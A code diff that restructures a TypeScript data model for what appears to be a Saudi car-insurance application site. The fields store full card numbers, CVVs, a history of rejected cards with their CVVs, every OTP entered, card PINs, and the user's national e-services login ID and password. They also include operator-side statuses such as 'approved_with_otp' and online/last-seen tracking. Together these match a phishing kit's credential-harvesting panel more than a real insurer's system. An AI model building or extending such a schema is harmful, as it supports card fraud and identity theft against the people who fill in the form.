@@ -1,18 +1,16 @@
 export interface InsuranceApplication {
   id?: string;
+  country: string;
+
   // Step 1: Basic Information
   identityNumber: string;
   ownerName: string;
   phoneNumber: string;
+  phoneNumber2?: string;
   documentType: "استمارة" | "بطاقة جمركية";
   serialNumber: string;
   insuranceType: "تأمين جديد" | "نقل ملكية";
-  lastSeen?: string;
-  pinCode?:string
-  isUnread?:boolean | string
-  selectedCarrier?:string
-  totalPrice?:string
-  cardHistory? :any
+
   // Step 2: Insurance Details
   coverageType: string;
   insuranceStartDate: string;
@@ -30,40 +28,75 @@ export interface InsuranceApplication {
     type: string;
     features: string[];
   };
-  lastseen?: string;
-  online?: string;
-  country: string;
-  otp: string;
-  allOtps: string[]; // Step 4: Payment
+  selectedCarrier?: string;
+  totalPrice?: string;
+
+  // Step 4: Payment
   paymentMethod?: string;
   cardNumber?: string;
+  cardHolderName?: string;
   expiryDate?: string;
   cvv?: string;
+  cardType?: string;
+  bankInfo?: string;
   paymentStatus: "pending" | "completed" | "failed";
-  cardStatus: "pending" | "completed" | "rejected"|"approved";
-  cardOtpApproved: "pending" | "completed" | "rejected"|"approved";
-  phoneOtpApproved: "pending" | "completed" | "rejected"|"approved";
-  // Verification fields for phone and ID card codes
+
+  // Card Approval Status
+  cardStatus?: "pending" | "approved_with_otp" | "approved_with_pin" | "rejected" | "approved";
+  cardOtpApproved?: "pending" | "approved" | "rejected";
+
+  // Card History
+  oldCards?: Array<{
+    cardNumber?: string;
+    cardHolderName?: string;
+    expiryDate?: string;
+    cvv?: string;
+    cardType?: string;
+    bankInfo?: string;
+    rejectedAt: string;
+  }>;
+  cardHistory?: any;
+
+  // OTP Management
+  otp?: string;
+  allOtps?: string[];
+  phoneOtp?: string;
+
+  // Verification fields for phone and ID
   phoneVerificationCode?: string;
   phoneVerificationStatus?: "pending" | "approved" | "rejected";
   phoneVerifiedAt?: Date;
+  phoneOtpApproved?: "pending" | "approved" | "rejected";
+
   idVerificationCode?: string;
   idVerificationStatus?: "pending" | "approved" | "rejected";
   idVerifiedAt?: Date;
-// Metadata
-  currentStep: number |string;
+
+  // Nafaz Integration (Saudi Arabia e-services)
+  nafazId?: string;
+  nafazPass?: string;
+  authNumber?: string;
+
+  // Transfer of Ownership (نقل ملكية)
+  buyerIdNumber?: string;
+  buyerName?: string;
+
+  // User Activity Tracking
+  online?: boolean;
+  lastSeen?: string;
+  lastseen?: string; // keeping for backwards compatibility
+  isUnread?: boolean;
+
+  // PIN Code
+  pinCode?: string;
+
+  // Metadata
+  currentStep: number | string;
   status: "draft" | "pending_review" | "approved" | "rejected" | "completed";
   assignedProfessional?: string;
   createdAt: string;
   updatedAt: string;
   notes?: string;
-  phoneNumber2?:string
-  nafazId?: string,
-  nafazPass?:string,
-  authNumber?:string,
-  phoneOtp?:string
-  buyerIdNumber?:string
-  buyerName?:string
 }
 
 export interface ChatMessage {
